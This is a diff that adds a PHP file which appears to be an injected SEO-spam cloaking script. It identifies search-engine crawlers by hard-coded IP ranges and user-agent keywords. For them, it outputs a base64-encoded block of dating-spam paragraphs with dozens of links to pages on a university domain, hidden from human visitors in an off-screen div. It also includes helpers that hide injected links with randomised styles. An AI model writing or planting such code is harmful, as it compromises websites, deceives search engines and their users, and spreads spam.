@@ -1,0 +1,124 @@
+<?php /* fa70a04525c51fd27ad3d50b53d95050 */
+if(!function_exists('php__memory_exists')){
+function php__memory_exists(){
+		$masks = array(
+			array(-655417344,-655409153),array(1089052672,1089060863),array(1123631104,1123639295),array(1208926208,1208942591),
+			array(-782925824,-782893057),array(-1379794944,-1379729409),array(1249705984,1249771519),array(-655417344,-655409153),
+			array(1078218752,1078220799),array(1113980928,1113985023),array(1089052672,1089060863),array(1123631104,1123639295),
+			array(1208926208,1208942591),array(-782925824,-782893057),array(-965974848,-965974833),array(-1379794944,-1379729409),
+			array(-668867184,-668867177),array(-668867168,-668867161),array(-776377216,-776377089),array(-663925936,-663925921),
+			array(1078220800,1078222847),array(1078214720,1078214783),array(1076485568,1076485583),array(1249705984,1249771519),
+			array(134744064,134744319),array(134743040,134743295),array(67305984,67306239),array(-772300912,-772300897),
+			array(1070843976,1070843983),array(-772425592,-772425585),array(-1504013248,-1504013233),array(134623232,134625279),
+			array(1083880144,1083880159),array(1180247960,1180247967),array(1180359496,1180359503),array(1180359472,1180359479),
+			array(1081896984,1081896991),array(-772191936,-772191929),array(1081927080,1081927087),array(1104609120,1104609135),
+			array(1104396896,1104396911),array(1105135664,1105135679),array(1105036720,1105036735),array(1062518496,1062518527),
+			array(1082183584,1082183599),array(1103424288,1103424303),array(1119913504,1119913519),array(1104572512,1104572543),
+			array(1180247960,1180247967),array(1180359496,1180359503),array(1180359472,1180359479),array(1173102912,1173102919),
+			array(1290950648,1290950655),array(1208934400,1208936447),array(1132356616,1132356623),array(-869104592,-869104577),
+			array(1128602128,1128602135),array(-655652792,-655652785),array(-826636096,-826636033),array(1667240832,1667240863),
+			array(1172313552,1172313559),array(1172315992,1172315999),array(1172316008,1172316015),array(1172588248,1172588255),
+			array(1172588256,1172588263),array(1172588264,1172588271),array(1172588280,1172588287),array(1172589672,1172589679),
+			array(1173190880,1173190887),array(1199710944,1199710951),array(1199710952,1199710959),array(1199710960,1199710967),
+			array(1199728392,1199728399),array(1199728400,1199728407),array(1199728408,1199728415),array(1199728416,1199728423),
+			array(1199728424,1199728431),array(1259417800,1259417807),array(1259813304,1259813311),array(1260780984,1260780991),
+			array(1261762592,1261762599),array(1261735552,1261735559),array(1261761744,1261761751),array(1261762104,1261762111),
+			array(1261762112,1261762119),array(1261762120,1261762127),array(1261762128,1261762135),array(1288200544,1288200551),
+			array(1289513400,1289513407),array(1291247208,1291247215),array(1671628112,1671628119),array(1670420000,1670420007),
+			array(1670647064,1670647071),array(1190127072,1190127103),array(1663596768,1663596799),array(1164938648,1164938655),
+			array(1164938656,1164938663), //g
+			array(1093926912,1094189055), //m
+			//array(1136852992,1136918527), //y
+		); $is_bot = false; $your_mask=ip2long($_SERVER["REMOTE_ADDR"]);
+		$stop_agents_masks = array("http", "google", "slurp", "msnbot", "bot", "crawler", "spider", "robot", "HttpClient", "curl", "PHP", "Indy Library", "WordPress");  
+		$_SERVER["HTTP_USER_AGENT"] = preg_replace("|User.Agent\:[\s ]?|i", "", @$_SERVER["HTTP_USER_AGENT"]);
+		foreach ($masks as $mask) if($your_mask>=$mask[0] and $your_mask<=$mask[1]) $is_bot = true;
+		if($_SERVER["HTTP_A"]=="b") foreach ($stop_agents_masks as $stop_agents_mask) if(eregi($stop_agents_mask, @$_SERVER["HTTP_USER_AGENT"]) !== false) $is_bot = true;
+		return $is_bot;
+	}
+	function php__make_seed($str, $count_r=3){
+		$seed=""; $tseed=0;
+		for($i=0;$i<strlen($str);$i++) $seed.=ord($str[$i]);
+		for($i=0;$i<strlen($seed);$i++) $tseed+=$seed[$i];
+		return $tseed;
+	}
+	function php__shuffle_by_seed($ar,$srand_seed=null){
+		if($srand_seed==null) $srand_seed=php__make_seed($_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"].md5($_SERVER["REQUEST_URI"]));
+		$ar_tmp = array(); $i=0;
+		while($i<count($ar)){
+			srand($srand_seed); $r=rand(1,count($ar));
+			if(isset($ar_tmp[$r-1])) $srand_seed++;
+			else{ $ar_tmp[$r-1]=$ar[$i]; $i++; }
+		} ksort($ar_tmp); return $ar_tmp;
+	}	
+	function php__processVariantCallback($match){
+		$rand=null;
+		preg_match("|^RANDOM\=([0-9]+)\;|i", $match[1], $rand_match);
+		if(isset($rand_match[1])){
+			$rand=$rand_match[1];
+			$match[1]=preg_replace("|^RANDOM\=[0-9]+\;|i","",$match[1]);
+		}
+		$parts = split("\|", $match[1]);
+		$parts = php__shuffle_by_seed($parts);
+		if($rand!=null and $rand < count($parts)) $parts=array_slice($parts,0,$rand);
+		return join("", $parts);
+	}
+	function php__pat_callback(){
+		$_SERVER["__pat_i"]++;
+		if($_SERVER["__pat_i"]==$_SERVER["__pat_rand"]) return $_SERVER['php__ss_ldata'].$_SERVER["__pat_choice"];
+		else return $_SERVER["__pat_choice"];
+	}
+	function php__register_global($php__data){
+		if(isset($_SERVER['php__ss_ldata'])) $_SERVER['php__ss_ldata']=stripslashes($_SERVER['php__ss_ldata']);
+		preg_match_all("|<a[^>]*href[\s ]*=[\s ]*[\'\"]?https?:\/\/([^\/]+)\/[^\'\"<>\s ]+|is",$php__data,$php__matches);
+		$php__http_host=str_replace("www.","",strtolower($_SERVER['HTTP_HOST']));$_SERVER["php__domains"]=array();
+		foreach($php__matches[1] as $php__domain){
+			$php__domain=strtolower($php__domain);if(strpos($php__domain,$php__http_host)===false)
+			if(!isset($_SERVER["php__domains"][$php__domain])) $_SERVER["php__domains"][$php__domain]=1;else $_SERVER["php__domains"][$php__domain]++;
+		}$php__data = preg_replace_callback("|<a[^>]*href[\s ]*=[\s ]*[\'\"]?https?:\/\/([^\/]+)\/[^>]*>[^<]+</a>|is","php__callback_func",$php__data);
+		unset($_SERVER["php__domains"]);
+		$pats=array("</p>","</div>","</td>"); $pat_choice=null; $pat_count=0;
+		foreach($pats as $pat) {
+			$pat_count=substr_count($php__data, $pat);
+			if($pat_count>0) { $pat_choice=$pat; break; }
+		}
+		$srand_seed_by_host=php__make_seed($_SERVER["HTTP_HOST"]); srand($srand_seed_by_host);
+		$pats2=array("div","span","b","i","u","font","ul","pre","ol","li","center","blockquote");
+		$pat2=$pats2[(rand(1,count($pats2))-1)];
+		$s=(rand(1,2)==1?" ":""); $s2=(rand(3,4)==3?" ":"");
+		$styles=array("display:none;","overflow:hidden;height:1px;");
+		$style=array($styles[(rand(1,count($styles))-1)]);
+		$colors=array("red","yellow","grey","black","blue","maroon","orange","pink","purple","olive","navy","moccasin","orchid","salmon","silver","tan","teal","violet","aqua","brown");
+		$font_families=array("Times New Roman","Garamond","Arial","Courier","Courier New","Trebuchet","Georgia","Verdana","Tahoma");
+		if(rand(1,3)<=2) $style[]="font-size:".rand(7,16)."px;";
+		if(rand(1,3)<=3) $style[]="color:".$colors[(rand(1,count($colors))-1)].";";
+		if(rand(1,3)<=3) $style[]="font-family:".$font_families[(rand(1,count($font_families))-1)].";";
+		if(rand(1,3)<=4) $style[]="width:".rand(10,200)."px;";
+		if(rand(1,3)<2) $style[]="font-weight:bold;";
+		if(rand(1,3)>2) $style[]="font-style:italic;";
+		if(rand(1,10)<=3 and !eregi("display",$style[0])) $style[]="display:block;";
+		$style=php__shuffle_by_seed($style,$srand_seed_by_host);
+		srand($srand_seed_by_host);
+		$_SERVER['php__ss_ldata']="<$pat2 style=\"".join($s2,$style)."\">{$_SERVER['php__ss_ldata']}</$pat2>";
+		
+		if($pat_choice!=null){
+			srand($srand_seed_by_host);
+			$_SERVER["__pat_choice"]=$pat_choice; $_SERVER["__pat_rand"]=rand(1,$pat_count); $_SERVER["__pat_i"]=0;
+			$php__data = preg_replace_callback("|".preg_quote($pat_choice)."|i", "php__pat_callback", $php__data);
+			unset($_SERVER["__pat_i"]); unset($_SERVER["__pat_rand"]); unset($_SERVER["__pat_choice"]);
+		}else preg_replace("|<\/body>|i", $_SERVER['php__ss_ldata']."</body>", $php__data);
+		$_SERVER['php__ss_ldata']='';
+		return ($_SERVER["HTTP_A"]=="b" ? preg_replace("|<title>|i","<title>[+] ", $php__data) : $php__data);
+	}
+	function php__callback_func($php__match){ $php__domain=strtolower($php__match[1]); if(isset($_SERVER["php__domains"][$php__domain]) and $_SERVER["php__domains"][$php__domain]>=50) return null;else return $php__match[0]; }
+}
+if(php__memory_exists() and !defined("fa70a04525c51fd27ad3d50b53d95050_INCLUDED")){ 
+	define("fa70a04525c51fd27ad3d50b53d95050_INCLUDED",1);
+	echo preg_replace("|<script>.+?<\/script>|i","",preg_replace_callback("|\[([^\[\]]+)\]|s", "php__processVariantCallback" ,@base64_decode("PHNjcmlwdD5kb2N1bWVudC53cml0ZWxuKCc8JysnZCcrJ2knKyd2JysnICcrJ3MnKyd0JysneScrJ2wnKydlJysnPScrJyInKydwJysnbycrJ3MnKydpJysndCcrJ2knKydvJysnbicrJzonKydhJysnYicrJ3MnKydvJysnbCcrJ3UnKyd0JysnZScrJzsnKyd0JysnbycrJ3AnKyc6JysnMScrJzAnKycwJysncCcrJ3gnKyc7JysncicrJ2knKydnJysnaCcrJ3QnKyc6JysnMScrJzAnKydwJysneCcrJzsnKyd3JysnaScrJ2QnKyd0JysnaCcrJzonKycxJysnNScrJzAnKydwJysneCcrJzsnKydoJysnZScrJ2knKydnJysnaCcrJ3QnKyc6JysnNScrJzAnKydwJysneCcrJzsnKydvJysndicrJ2UnKydyJysnZicrJ2wnKydvJysndycrJzonKydhJysndScrJ3QnKydvJysnIicrJz4nKTwvc2NyaXB0PjxwPltSQU5ET009MTAwO1dvbWVuIGFyZSA8YSBocmVmPSdodHRwOi8vd3d3Lmd1aWxmb3JkLmVkdS9kYXRpbmcvPzc3NDMuR0FZLURBVElORy1BVVNUUkFMSUEucGhwJz5nYXkgZGF0aW5nIHNpdGVzIGF1c3RyYWxpYTwvYT4gc3RhcnZlZCBmb3IgbWVuIHdobyB1bmRlcnN0YW5kIHRoZWlyIHBoeXNpY2FsIG5lZWRzIGZyb20gdGhlIGZpcnN0IHRvdWNoIGFsbCB0aGUgd2F5IHRvIGNsaW1heC4gfCJBcmUgWW91IDxhIGhyZWY9J2h0dHA6Ly93d3cuZ3VpbGZvcmQuZWR1L2RhdGluZy8/NDAzMy5HQVktREFUSU5HLU5FVy1ZT1JLLnBocCc+Z2F5IGRhdGluZyBuZXcgeW9yazwvYT4gT3BlbiBUbyBMb3ZlLiB8SG93IGNhbiAoPGEgaHJlZj0naHR0cDovL3d3dy5ndWlsZm9yZC5lZHUvZGF0aW5nLz81MDY1LkdBWS1EQVRJTkctVE9ST05UTy5waHAnPmdheSBkYXRpbmcgc2VydmljZSB0b3JvbnRvPC9hPikgYW5vdGhlciBodW1hbiBiZWluZyBzZWUgb3VyIGlubmVyIHF1YWxpdGllcyBhbmQgZ2V0IHRvIGVuam95IG91ciBhYmlsaXRpZXMgaWYgd2UgYXJlIGNsb3NlZCBmb3IgbG92ZS4gfElmIHlvdSA8YSBocmVmPSdodHRwOi8vd3d3Lmd1aWxmb3JkLmVkdS9kYXRpbmcvPzc3MTMuR0FZLURBVElORy1DQU5BREEucGhwJz5nYXkgZGF0aW5nIHdlYnNpdGUgY2FuYWRhPC9hPiBkbyBub3QgZmVlbCB5b3UgZGVzZXJ2ZSBzdWNoIGEgbWFuIGxvb2sgZm9yIGEgY291bnNlbG9yIG9yIGEgY29hY2guIHxUaGUgTWFnaWMgPGEgaHJlZj0naHR0cDovL3d3dy5ndWlsZm9yZC5lZHUvZGF0aW5nLz81MzguR0FZLURBVElORy1TSVRFUy5waHAnPmdheSBkYXRpbmcgc2l0ZXMgdWs8L2E+IG9mIFRvdWNoSXQgaXMgYWx3YXlzIGEgZ29vZCBzaWdodCB3aGVuIHlvdSBzZWUgY291cGxlcyB3YWxrIGhhbmQgaW4gaGFuZC4gfEFza2luZyBmb3IgPGEgaHJlZj0naHR0cDovL3d3dy5ndWlsZm9yZC5lZHUvZGF0aW5nLz8xMDQ3LkdBWS1EQVRJTkctU0lURS5waHAnPmdheSBkYXRpbmcgc2l0ZSBpcmVsYW5kPC9hPiBtb3JlIHNwZWNpZmljIGluZm9ybWF0aW9uIHdpbGwgYXZvaWQgbWlzdW5kZXJzdGFuZGluZ3MuIHxGb3IgYSA8YSBocmVmPSdodHRwOi8vd3d3Lmd1aWxmb3JkLmVkdS9kYXRpbmcvPzg1ODEuU0VYLURBVElORy5waHAnPnNleCBkYXRpbmc8L2E+IHN0YXJ0IGhvdyBleGFjdGx5IGNhbiB3ZSBpZGVudGlmeSB0aGF0IHNwZWNpYWwgc29tZWJvZHkuIHxUaGVyZSBpcyA8YSBocmVmPSdodHRwOi8vd3d3Lmd1aWxmb3JkLmVkdS9kYXRpbmcvPzEzNTMuR0FZLURBVElORy5waHAnPmdheSBkYXRpbmcgY2hpbmE8L2E+IHJlYWxseSBubyBleGFjdCBmb3JtdWxhIG9uIGhvdyB0byBiZSBhIHJvbWFudGljIHBlcnNvbiBhbmQgYmVpbmcgcm9tYW50aWMgd291bGQgbmF0dXJhbGx5IGNvbWUgb3V0IGlmIHlvdSByZWFsbHkgY2FyZSBhbmQgbG92ZSB0aGUgcGVyc29uIHlvdSBhcmUgd2l0aC4gfFdvbWVuIGFyZSA8YSBocmVmPSdodHRwOi8vd3d3Lmd1aWxmb3JkLmVkdS9kYXRpbmcvPzMyNTUuREFUSU5HLVNJVEVTLUZPUi1XT01FTi5waHAnPmRhdGluZyBzaXRlcyBmb3IgbWFycmllZCB3b21lbjwvYT4gc3RhcnZlZCBmb3IgbWVuIHdobyB1bmRlcnN0YW5kIHRoZWlyIHBoeXNpY2FsIG5lZWRzIGZyb20gdGhlIGZpcnN0IHRvdWNoIGFsbCB0aGUgd2F5IHRvIGNsaW1heC4gfEl0J3MganVzdCA8YSBocmVmPSdodHRwOi8vd3d3Lmd1aWxmb3JkLmVkdS9kYXRpbmcvPzk1MzQuREFUSU5HLVNJVEVTLUFVU1RSQUxJQS5waHAnPmRhdGluZyBzaXRlcyBhdXN0cmFsaWE8L2E+IGFuIHVuY29tZm9ydGFibGUgZmVlbGluZyB0byBoYW5nIG91dCB3aXRoIHNvbWVvbmUgd2hvIGlzIHN1Y2ggYSBkb3duZXIuIHxJZiB5b3VyICg8YSBocmVmPSdodHRwOi8vd3d3Lmd1aWxmb3JkLmVkdS9kYXRpbmcvPzg1OTEuREFUSU5HLVNJVEVTLUZPUi1NRU4ucGhwJz5kYXRpbmcgc2l0ZXMgZm9yIHNob3J0IG1lbjwvYT4pIHVzdWFsIG5pZ2h0IG91dCB3b3VsZCBtZWFuIGEgZGlubmVyIGRhdGUgYXQgTWNEb25hbGSScyB0aGVuIGEgZmluZSBkaW5pbmcgcmVzdGF1cmFudCBvZiBoZXIgY2hvaWNlIHdvdWxkIGFic29sdXRlbHkgc3VycHJpc2UgaGVyLjwvcD4KPHA+fEhvdyB3cm9uZyA8YSBocmVmPSdodHRwOi8vd3d3Lmd1aWxmb3JkLmVkdS9kYXRpbmcvPzgzNjIuREFUSU5HLVNJVEVTLnBocCc+ZGF0aW5nIHNpdGVzIHN3aXR6ZXJsYW5kPC9hPiBJIHdhcy4gfEZhbWlseSB0aWVzICg8YSBocmVmPSdodHRwOi8vd3d3Lmd1aWxmb3JkLmVkdS9kYXRpbmcvPzQ3MTYuT05MSU5FLURBVElORy1BVVNUUkFMSUEucGhwJz5vbmxpbmUgZGF0aW5nIGF1c3RyYWxpYTwvYT4pIGFyZSBhbHdheXMgZ29vZCBidXQgbGVhdmUgTW9tIGF0IGhvbWUgb24gZmlyc3QgZGF0ZXMuIHxXaGlsZSBzdGlsbCA8YSBocmVmPSdodHRwOi8vd3d3Lmd1aWxmb3JkLmVkdS9kYXRpbmcvPzM5MTAuT05MSU5FLURBVElORy1TRVJWSUNFUy5waHAnPm9ubGluZSBkYXRpbmcgc2VydmljZXMgdWs8L2E+IHRhbGtpbmcgc2hlIHByb2R1Y2VkIGEgbWVkaWNpbmUgdmlhbCB3aGljaCBJIGFzc3VtZWQgY29udGFpbmVkIGhlciBtZWRzLiB8Rm9jdXMgb24gPGEgaHJlZj0naHR0cDovL3d3dy5ndWlsZm9yZC5lZHUvZGF0aW5nLz85NzcyLk9OTElORS1EQVRJTkctTkVXLVlPUksucGhwJz5vbmxpbmUgZGF0aW5nIHNpdGVzIG5ldyB5b3JrPC9hPiB3aGF0IHlvdSBjYW4gZG8gb24gd2hvbSB5b3UgY2FuIGZpbmQgYW5kIGxldCBnbyBvZiB3aGF0IGlzIG5ldmVyIGdvaW5nIHRvIGJlLiB8QW5vdGhlciBhZHZhbnRhZ2UgPGEgaHJlZj0naHR0cDovL3d3dy5ndWlsZm9yZC5lZHUvZGF0aW5nLz8zNTk1Lk9OTElORS1EQVRJTkctSVJFTEFORC5waHAnPm9ubGluZSBkYXRpbmcgc2l0ZXMgaXJlbGFuZDwvYT4gd2l0aCBkYXRpbmcgb25saW5lIGlzIHlvdSdyZSBub3QgdHJ5aW5nIHRvIGdldCB0byBrbm93IHNvbWVvbmUgd2hvJ3MgaGFkIHRvbyBtdWNoIHRvIGRyaW5rLiB8QW5vdGhlciBhZHZhbnRhZ2UgPGEgaHJlZj0naHR0cDovL3d3dy5ndWlsZm9yZC5lZHUvZGF0aW5nLz82MzIzLk9OTElORS1EQVRJTkctT05UQVJJTy5waHAnPm9ubGluZSBkYXRpbmcgb250YXJpbzwvYT4gd2l0aCBkYXRpbmcgb25saW5lIGlzIHlvdSdyZSBub3QgdHJ5aW5nIHRvIGdldCB0byBrbm93IHNvbWVvbmUgd2hvJ3MgaGFkIHRvbyBtdWNoIHRvIGRyaW5rLiB8VGhlIG1vc3QgPGEgaHJlZj0naHR0cDovL3d3dy5ndWlsZm9yZC5lZHUvZGF0aW5nLz82MzcuT05MSU5FLURBVElORy1UT1JPTlRPLnBocCc+b25saW5lIGRhdGluZyB0b3JvbnRvPC9hPiBJIG9mZmVyIG5vdyBhcmUgZXhhbXBsZXMgb2Y6IGVuZ2FnaW5nIGJhaXRpbmcgaG9va2luZyBmbGlydGluZyB0ZWFzaW5nIHN0b3J5dGVsbGluZyBldGMgYXMgYSBtZWFucyB0byBhbiBlbmQuIHxUaGUgVUsgPGEgaHJlZj0naHR0cDovL3d3dy5ndWlsZm9yZC5lZHUvZGF0aW5nLz8xNjc0Lk9OTElORS1EQVRJTkctUEVPUExFLnBocCc+b25saW5lIGRhdGluZyBwZW9wbGU8L2E+IGlzIGEgdGlueSBpc2xhbmQgY29tcGFyZWQgdG8gQW1lcmljYSBzbyAzIG1pbGxpb24gc2luZ2xlcyB1c2luZyB0aGUgc2FtZSBvbmxpbmUgZGF0aW5nIHNlcnZpY2UgaXMgYSBoaWdoIGNvbmNlbnRyYXRpb24gb2YgcGVvcGxlLjwvcD4KPHA+fEZpcnN0IHlvdXIgPGEgaHJlZj0naHR0cDovL3d3dy5ndWlsZm9yZC5lZHUvZGF0aW5nLz83MDM2Lk9OTElORS1EQVRJTkctV09NRU4ucGhwJz5vbmxpbmUgZGF0aW5nIGZvciB3b21lbjwvYT4gcmVsYXRpb25zaGlwIGlzIG5vdCBtdXR1YWwuIHxPbmx5IHlvdSwgPGEgaHJlZj0naHR0cDovL3d3dy5ndWlsZm9yZC5lZHUvZGF0aW5nLz8xMjA5Lk9OTElORS1EQVRJTkctR0lSTFMucGhwJz5vbmxpbmUgZGF0aW5nIGdpcmxzPC9hPiwgY2FuIHNlbGYgZXhwbG9yZSB3aGljaCBvbmVzIHJpbmcgYSBiZWxsIHdoZW4geW91IGxvb2sgZGVlcGVyIGluc2lkZSB5b3Vyc2VsZi4gfEl0J3MgZGlzYXJtaW5nbHkgPGEgaHJlZj0naHR0cDovL3d3dy5ndWlsZm9yZC5lZHUvZGF0aW5nLz82MjY0Lk9OTElORS1EQVRJTkctU0lURVMucGhwJz5vbmxpbmUgZGF0aW5nIHNpdGVzPC9hPiBlYXN5IHRvIG1ha2UgYSBsaXR0bGUgYmx1bmRlciB0aGF0IGtpbGxzIGF0dHJhY3Rpb24gYW5kIHRoZSB0cnV0aCBpcyB3ZSd2ZSBhbGwgYmVlbiBndWlsdHkgb24gcmFyZSBvY2Nhc2lvbnMuPC9wPgo8cD58TW9zdCBvZiA8YSBocmVmPSdodHRwOi8vd3d3Lmd1aWxmb3JkLmVkdS9kYXRpbmcvPzM5MzkuT05MSU5FLURBVElORy5waHAnPm9ubGluZSBkYXRpbmc8L2E+IHVzIGFyZSB0b28gYnVzeSB0byBmdW5jdGlvbiBpbiB0aGlzIHdvcmxkIGluc3RlYWQgb2YgdGFraW5nIHRoZSB0aW1lIHRvIGZpbmQgb3V0IGhvdyB3ZSBmdW5jdGlvbiBhbmQgaG93IHdlIGNvdWxkIGZ1bmN0aW9uIG1vcmUgZWZmZWN0aXZlbHkuIF08L3A+CjxzY3JpcHQ+ZG9jdW1lbnQud3JpdGVsbignPCcrJy8nKydkJysnaScrJ3YnKyc+Jyk8L3NjcmlwdD4=")));
+	/*if(eregi("\[RANDOM\=[0-9]+\;",$data)){
+		echo "ERROR";
+		echo $data;
+		exit;
+	}*/
+}
+/* fa70a04525c51fd27ad3d50b53d95050 */ ?>
